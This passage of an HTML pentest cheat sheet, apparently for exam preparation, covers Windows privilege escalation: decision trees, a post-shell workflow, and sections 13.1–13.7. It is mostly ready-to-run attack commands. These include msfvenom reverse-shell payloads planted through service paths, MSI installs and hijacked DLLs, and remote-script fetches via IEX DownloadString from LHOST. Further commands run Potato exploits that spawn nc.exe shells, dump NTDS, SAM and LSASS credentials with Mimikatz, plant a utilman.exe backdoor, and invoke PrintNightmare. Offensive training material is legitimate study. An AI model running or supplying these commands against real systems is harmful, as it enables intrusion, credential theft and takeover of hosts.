+  ├─ YES → attempt supported decryption/extraction path
+  └─ NO  → collect metadata and search for alternate key/context
+  ↓
+Test recovered credential against in-scope services where appropriate
+</code></pre>
+<p>Useful enumeration:</p>
+<pre class="ref-code"><code class="language-cmd">cmdkey /list
+dir /a "%APPDATA%\Microsoft\Credentials" 2&gt;nul
+dir /a "%LOCALAPPDATA%\Microsoft\Credentials" 2&gt;nul
+</code></pre>
+<h4>Tree J — LAPS / local administrator secrets in AD context</h4>
+<pre class="ref-code"><code class="language-text">DOMAIN-JOINED HOST + DOMAIN CREDENTIAL
+  ↓
+Is Windows LAPS / legacy LAPS deployed?
+  ↓
+Can current principal read the password attribute for any computer?
+  ├─ YES → identify exactly which computer + expiration + account
+  └─ NO  → enumerate delegated groups/ACLs instead of guessing
+  ↓
+Credential valid for target computer?
+  ├─ YES → local-admin path on that computer
+  └─ NO  → check rotation/target/account mismatch
+</code></pre>
+<p>Do not treat “LAPS exists” as a finding; <strong>read permission to a relevant password attribute</strong> is what matters.</p>
+<h4>Tree K — Named pipe / IPC finding</h4>
+<pre class="ref-code"><code class="language-text">INTERESTING NAMED PIPE
+  ↓
+Which process owns/exposes it?
+  ↓
+Does privileged process accept client-controlled interaction?
+  ↓
+Pipe ACL + impersonation behavior + trigger
+  ↓
+Can interaction produce privileged token/action?
+  ├─ YES → map to compatible impersonation technique
+  └─ NO  → ordinary IPC; move on
+</code></pre>
+<pre class="ref-code"><code class="language-powershell">Get-ChildItem \\.\pipe\
+</code></pre>
+<p>Correlate with Process Explorer/Procmon when possible.</p>
+<h4>Tree L — Driver / kernel CVE: last resort</h4>
+<pre class="ref-code"><code class="language-text">WINDOWS BUILD / DRIVER MATCH
+  ↓
+Exact build + patch level + architecture
+  ↓
+Exact vulnerable driver/version present?
+  ↓
+Required device/interface reachable as current user?
+  ↓
+Mitigations + exploit prerequisites confirmed?
+  ↓
+Stable public reproducer for same build?
+  ├─ YES → consider after service/config/credential paths
+  └─ NO  → discard scanner/version-only result
+</code></pre>
+<pre class="ref-code"><code class="language-cmd">systeminfo
+powershell -NoProfile -Command "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 HotFixID,InstalledOn"
+driverquery /v
+REM Full triage + WMIC fallback: search [WIN:KERNEL]
+</code></pre>
+<h3>Windows 10-second "worth pursuing?" test</h3>
+<p>For every candidate, answer:</p>
+<pre class="ref-code"><code class="language-text">1. Which privileged identity executes/owns the vulnerable action?
+2. What exact service/file/registry/task/token object can I control?
+3. Can I trigger it now or predict the natural trigger?
+4. What minimal identity/permission check proves the hypothesis?
+</code></pre>
+<p>If <strong>privileged context + control + trigger</strong> are not all present, keep enumerating.</p>
+</details>
+<hr/>
+
+<details id="ref-13-0-v16-windows-post-shell-workflow">
+<summary>WIN 13.0 Windows Post-Shell Workflow — Save, Read, Validate, Re-enumerate</summary>
+<p><code>[WIN:WORKFLOW] [WIN:TREE]</code></p>
+<blockquote><p><strong>CORE:</strong> The purpose of this workflow is to prevent two common mistakes: running automated enumeration without reading it, and jumping to kernel/CVE exploitation before checking simpler privilege, credential, service and task paths.</p></blockquote>
+<pre class="ref-code"><code class="language-text">WINDOWS SHELL
+  ↓
+BASELINE identity / privileges / OS / network
+  ↓
+QUICK FILESYSTEM TRIAGE (C:\, Users, Program Files, ProgramData)
+  ↓
+PRIVESCHECK / WINPEAS / SEATBELT → SAVE OUTPUT → READ IT
+  ↓
+CREDENTIALS / HISTORY / CONFIG / SAVED CREDS
+  ↓
+TOKEN PRIVILEGES
+  ↓
+SERVICES → TASKS → AUTORUNS / INSTALLER POLICY
+  ↓
+LOCAL-ONLY LISTENERS + NON-DEFAULT SOFTWARE / CUSTOM BINARIES
+  ↓
+EXACT HYPOTHESIS: privileged actor + controlled object + trigger
+  ↓
+VALIDATE → EXPLOIT
+  ↓
+NEW IDENTITY? START THIS LOOP AGAIN
+  ↓
+DRIVER / KERNEL / PATCH CVE LAST
+</code></pre>
+<h3>Baseline</h3>
+<pre class="ref-code"><code class="language-cmd">whoami /all
+hostname
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+ipconfig /all
+route print
+netstat -ano
+net user %USERNAME%
+net localgroup administrators
+</code></pre>
+<h3>Fast filesystem triage</h3>
+<pre class="ref-code"><code class="language-cmd">dir C:\ /a
+tree /F /A C:\Users
+dir "C:\Program Files"
+dir "C:\Program Files (x86)" 2&gt;nul
+dir C:\ProgramData /a
+</code></pre>
+<p>Focus on non-default folders, other readable user profiles, application data, custom services, web roots, backup/config files and anything that explains an installed process/listener.</p>
+<h3>Automated pass — output is evidence, not decoration</h3>
+<pre class="ref-code"><code class="language-powershell">Import-Module .\PrivescCheck.ps1
+Invoke-PrivescCheck | Tee-Object privesccheck.txt
+.\winPEASx64.exe | Tee-Object winpeas.txt
+.\Seatbelt.exe -group=all &gt; seatbelt.txt
+</code></pre>
+<p>Read saved output in this order: credentials → privileges → services → tasks → registry/installer/autoruns → installed applications/internal listeners → patch/kernel suggestions.</p>
+<h3>Credential pass</h3>
+<pre class="ref-code"><code class="language-cmd">cmdkey /list
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+for /d %u in (C:\Users\*) do @type "%u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2&gt;nul
+dir /s /b C:\Windows\Panther\*unattend* 2&gt;nul
+dir /s /b C:\inetpub\wwwroot\web.config 2&gt;nul
+</code></pre>
+<p>Also inspect service/application configuration under Program Files/ProgramData/AppData and readable profiles. A newly recovered credential must immediately enter the Credential Debt/fan-out workflow.</p>
+<h3>Services and tasks</h3>
+<pre class="ref-code"><code class="language-powershell">Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName
+schtasks /query /fo LIST /v
+Get-ScheduledTask | Select-Object TaskName,TaskPath,State
+</code></pre>
+<p>For each candidate verify: privileged account → writable binary/config/directory/ACL → ability to start/restart/trigger (or a predictable natural trigger).</p>
+<h3>Local-only listeners and software</h3>
+<pre class="ref-code"><code class="language-powershell">Get-NetTCPConnection -State Listen | Sort-Object LocalPort | Format-Table LocalAddress,LocalPort,OwningProcess
+Get-Process | Select-Object Id,ProcessName,Path
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* 2&gt;$null | Select DisplayName,DisplayVersion,InstallLocation
+Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* 2&gt;$null | Select DisplayName,DisplayVersion,InstallLocation
+</code></pre>
+<p>If a service only listens on loopback, test it from the target itself and correlate the PID with the application/config. Do not ignore a high-value service merely because Kali cannot reach it directly.</p>
+<h3>Re-enumeration trigger</h3>
+<pre class="ref-code"><code class="language-text">NEW USER / NEW GROUP / ADMIN / SYSTEM / NEW CREDENTIAL / NEW ROUTE
+  → whoami /all again
+  → repeat credential visibility checks
+  → repeat listeners/services/tasks
+  → if domain joined, re-enumerate AD with the new identity
+</code></pre>
+<h3>Kernel / driver / missing patch</h3>
+<p>Last resort after the higher-signal configuration paths. Confirm exact build, architecture, patch level, driver/component, exploit prerequisites and crash/recovery plan before testing.</p>
+</details>
+
+<h2 id="ref-13-privilege-escalation-windows-every-vector">13. PRIVILEGE ESCALATION --- WINDOWS (EVERY VECTOR)</h2>
+<details id="ref-13-1-automated-tools-run-these-first-2">
+<summary>⚙ 13.1 Automated Tools --- Run These First</summary>
+<pre class="ref-code"><code class="language-powershell"># ── WINPEAS (BEST for Windows) ────────────────────────────────
+.\winPEASx64.exe
+.\winPEASx86.exe           # 32-bit systems
+.\winPEASany.exe | Tee-Object winpeas.txt
+
+# ── POWERUP ───────────────────────────────────────────────────
+IEX(New-Object Net.WebClient).DownloadString('http://LHOST/PowerUp.ps1')
+Invoke-AllChecks | Out-File -Encoding ASCII powerup_results.txt
+
+# ── SEATBELT ──────────────────────────────────────────────────
+.\Seatbelt.exe -group=all
+.\Seatbelt.exe CredEnum WindowsCredentialFiles TokenPrivileges
+
+# ── SHARPUP ───────────────────────────────────────────────────
+.\SharpUp.exe audit
+
+# ── WATSON (patch-based privesc) ──────────────────────────────
+.\Watson.exe    # Shows exploitable missing patches
+
+# ── QUICK MANUAL CHECK ────────────────────────────────────────
+whoami /priv
+whoami /groups
+net user %username%
+net localgroup administrators
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+powershell -NoProfile -Command "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 HotFixID,InstalledOn"
+REM △ Older Windows fallback: wmic qfe list brief
+</code></pre>
+</details>
+<details id="ref-13-2-service-exploits">
+<summary>🛤️ 13.2 Service Exploits</summary>
+<pre class="ref-code"><code class="language-cmd">REM ── UNQUOTED SERVICE PATH ────────────────────────────────────
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
+REM PowerShell:
+Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select Name,PathName,StartMode
+
+REM Example: C:\Program Files\Vulnerable App\service.exe
+REM Try placing payload at: C:\Program.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o "C:\Program.exe"
+sc start VulnService
+
+REM ── WEAK SERVICE PERMISSIONS ──────────────────────────────────
+.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+.\accesschk.exe /accepteula -uwcqv "Everyone" *
+.\accesschk.exe /accepteula -uwcqv Users *
+REM If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:
+sc config VulnService binPath= "C:\Users\Public\shell.exe"
+sc stop VulnService &amp;&amp; sc start VulnService
+
+REM ── WRITABLE SERVICE BINARY ────────────────────────────────────
+icacls "C:\path\to\service.exe"
+REM If (W) write access:
+copy /y shell.exe "C:\path\to\service.exe"
+sc stop VulnService &amp;&amp; sc start VulnService
+</code></pre>
+</details>
+<details id="ref-13-3-registry-alwaysinstallelevated">
+<summary>📋 13.3 Registry &amp; AlwaysInstallElevated</summary>
+<pre class="ref-code"><code class="language-cmd">REM ── ALWAYSINSTALLELEVATED ──────────────────────────────────────
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+REM Both = 0x1 → create malicious MSI:
+msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi
+
+REM ── AUTORUNS WITH WEAK PERMS ───────────────────────────────────
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+REM Check if any listed binary is writable:
+icacls "C:\path\to\autorun.exe"
+REM If writable → replace with shell
+
+REM ── AUTOLOGON CREDENTIALS ──────────────────────────────────────
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+</code></pre></details>
+<details id="ref-13-4-token-impersonation-potato-attacks">
+<summary>POTATO 13.4 Token Impersonation --- Potato Attacks</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE MANUAL PATH</strong> · ✓ when prerequisites match · <code>[REQ:LOCAL_SHELL] [REQ:PRIVILEGE] [REQ:EXACT_BUILD]</code></p>
+</blockquote>
+<pre class="ref-code"><code class="language-powershell"># ── CHECK PRIVILEGES ──────────────────────────────────────────
+whoami /priv | findstr "SeImpersonatePrivilege\|SeAssignPrimaryTokenPrivilege"
+# These are held by: IIS AppPool, MSSQL Service, Network Service accounts
+
+# ── GODPOTATO (most universal — Windows 2012+) ────────────────
+.\GodPotato.exe -cmd "cmd /c whoami"
+.\GodPotato.exe -cmd "C:\Users\Public\nc.exe LHOST LPORT -e cmd"
+
+# ── PRINTSPOOFER (Windows 10 / Server 2016, 2019) ─────────────
+sc query Spooler    # Must be running
+.\PrintSpoofer.exe -i -c cmd
+.\PrintSpoofer.exe -c "C:\Users\Public\nc.exe LHOST LPORT -e cmd"
+
+# ── JUICYPOTATO (Windows &lt; 10 1809 / Server 2016 and older) ───
+# Need CLSID for OS: https://github.com/ohpe/juicy-potato/tree/master/CLSID
+.\JuicyPotato.exe -l 1337 -p "cmd.exe" -a "/c net localgroup administrators user /add" -t * -c {CLSID}
+
+# ── ROGUEPOTATO (Windows 10 1809+ / Server 2019) ──────────────
+.\RoguePotato.exe -r LHOST -e "C:\Users\Public\nc.exe LHOST LPORT -e cmd" -l 9999
+
+# ── SWEETPOTATO (combined) ────────────────────────────────────
+.\SweetPotato.exe -a "whoami"
+.\SweetPotato.exe -e EfsRpc -p C:\Users\Public\nc.exe -a "LHOST LPORT -e cmd"
+</code></pre>
+</details>
+<details id="ref-13-5-sensitive-privilege-abuse">
+<summary>💾 13.5 Sensitive Privilege Abuse</summary>
+<pre class="ref-code"><code class="language-powershell"># ── SeBackupPrivilege → SAM/NTDS dump ────────────────────────
+# Dump with diskshadow:
+Set-Content -Path C:\Windows\Temp\s.dsh -Value "set context persistent nowriters`nadd volume c: alias tmp`ncreate`nexpose %tmp% z:"
+diskshadow.exe /s C:\Windows\Temp\s.dsh
+robocopy /b z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
+# Transfer to Kali → impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+
+# ── SeRestorePrivilege → write any file ───────────────────────
+# Overwrite utilman.exe with cmd.exe:
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+# At Windows login screen → Win+U → cmd as SYSTEM
+
+# ── SeDebugPrivilege → dump LSASS ────────────────────────────
+# Mimikatz uses this:
+privilege::debug
+sekurlsa::logonpasswords
+
+# ── SeLoadDriverPrivilege → kernel driver ────────────────────
+# Load vulnerable signed driver (e.g. Capcom.sys) → SYSTEM
+</code></pre>
+</details>
+<details id="ref-13-6-dll-hijacking">
+<summary>📂 13.6 DLL Hijacking</summary>
+<pre class="ref-code"><code class="language-bash"># ── FIND MISSING DLL OPPORTUNITIES ───────────────────────────
+# Use Procmon on Windows: filter Result=NAME NOT FOUND + .dll in path
+# Or use winpeas output which lists writable directories in PATH
+
+# ── CREATE MALICIOUS DLL ─────────────────────────────────────
+msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o missing.dll
+
+# C template (more reliable):
+cat &gt; evil.c &lt;&lt; 'EOF'
+#include &lt;windows.h&gt;
+BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH)
+        system("cmd /c \"C:\\Users\\Public\\nc.exe LHOST LPORT -e cmd\"");
+    return TRUE;
+}
+EOF
+x86_64-w64-mingw32-gcc -shared -o missing.dll evil.c -lws2_32
+
+# DLL SEARCH ORDER (Windows):
+# 1. Application directory  ← most common hijack location
+# 2. System directory (C:\Windows\System32)
+# 3. Windows directory (C:\Windows)
+# 4. Current directory
+# 5. PATH directories
+</code></pre>
+</details>
+<details id="ref-13-7-windows-kernel-cves">
+<summary>📋 13.7 Windows Kernel CVEs</summary>
+<pre class="ref-code"><code class="language-powershell"># ── CHECK PATCH LEVEL ─────────────────────────────────────────
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+powershell -NoProfile -Command "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 HotFixID,InstalledOn"
+REM △ Older Windows fallback: wmic qfe list brief
+
+# ── WATSON / SHERLOCK ─────────────────────────────────────────
+.\Watson.exe
+IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Sherlock.ps1'); Find-AllVulns
+
+# ── KEY EXPLOITS ──────────────────────────────────────────────
+# MS16-032 — Win7-10 / 2008-2012R2:
+Invoke-MS16032 -Application cmd.exe -commandline "/c whoami"  # validate primitive first; avoid persistent account creation
+
+# CVE-2021-1675 / CVE-2021-34527 — PrintNightmare: verify exact affected build, patches, and Spooler state:
+python3 CVE-2021-1675.py "$DOMAIN/$AUTH_USER@$TARGET" '\\LHOST\share\evil.dll'  # omit :password; prefer the PoC's interactive prompt
+
+# CVE-2020-0796 — SMBGhost (Win10 1903/1909 — not 2004+):
+# Local LPE only (not remote — don't confuse versions)
+
+# CVE-2022-21999 — SpoolFool (Win10/Server with Print Spooler):
+.\SpoolFool.exe -dll evil.dll
+</code></pre>
+</details>
+<hr/>
